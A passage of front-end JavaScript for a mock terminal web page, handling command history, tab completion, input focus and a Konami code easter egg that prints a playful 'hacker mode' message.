                await typewriterCommand(input, 30);
                await sleep(200);
                await executeCommand(input);
            }
        }
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIndex > 0) {
            historyIndex--;
            terminalInput.value = commandHistory[historyIndex];
        }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            terminalInput.value = commandHistory[historyIndex];
        } else {
            historyIndex = commandHistory.length;
            terminalInput.value = '';
        }
    } else if (e.key === 'Tab') {
        e.preventDefault();
        const input = terminalInput.value.toLowerCase();
        const matches = Object.keys(commands).filter(cmd => cmd.startsWith(input));
        if (matches.length === 1) {
            terminalInput.value = matches[0];
        }
    }
});

// Keep focus
document.addEventListener('click', () => {
    terminalInput.focus();
});

// Initial focus
terminalInput.focus();

// Easter egg: Konami code
let konamiCode = [];
const konamiSequence = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];

document.addEventListener('keydown', (e) => {
    konamiCode.push(e.key);
    if (konamiCode.length > konamiSequence.length) {
        konamiCode.shift();
    }
    
    if (konamiCode.join(',') === konamiSequence.join(',')) {
        addOutput('<div class="success-line text-glow-green">🎮 KONAMI CODE ACTIVATED! Elite hacker mode enabled.</div>');
        konamiCode = [];
    }
});
